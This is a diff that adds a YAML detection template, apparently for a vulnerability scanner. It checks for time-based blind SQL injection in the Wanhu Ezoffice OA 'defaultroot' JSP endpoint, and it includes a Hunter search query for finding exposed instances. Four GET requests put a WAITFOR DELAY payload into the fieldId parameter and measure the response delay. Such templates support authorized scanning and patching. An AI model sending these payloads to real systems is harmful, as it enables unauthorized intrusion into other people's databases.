@@ -1,0 +1,34 @@
+id: wanhu-defaultroot-sqli
+
+info:
+  name: 万户 Ezoffice OA defaultroot SQL注入
+  author: zan8in
+  severity: high
+  verified: false
+  description: |-
+    Hunter: app.name="万户 Ezoffice OA"
+  tags: wanhu,sqli
+  created: 2023/12/08
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20WAITFOR%20DELAY%20%270:0:5%27--%20FMZL
+    expression: response.status == 200 && response.latency <= 6000 &&  response.latency >= 5000
+  r1:
+    request:
+      method: GET
+      path: /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20WAITFOR%20DELAY%20%270:0:9%27--%20FMZL
+    expression: response.status == 200 && response.latency <= 10000 &&  response.latency >= 9000
+  r2:
+    request:
+      method: GET
+      path: /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20WAITFOR%20DELAY%20%270:0:5%27--%20FMZL
+    expression: response.status == 200 && response.latency <= 6000 &&  response.latency >= 5000
+  r3:
+    request:
+      method: GET
+      path: /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20WAITFOR%20DELAY%20%270:0:9%27--%20FMZL
+    expression: response.status == 200 && response.latency <= 10000 &&  response.latency >= 9000
+expression: r0() && r1() && r2() && r3()
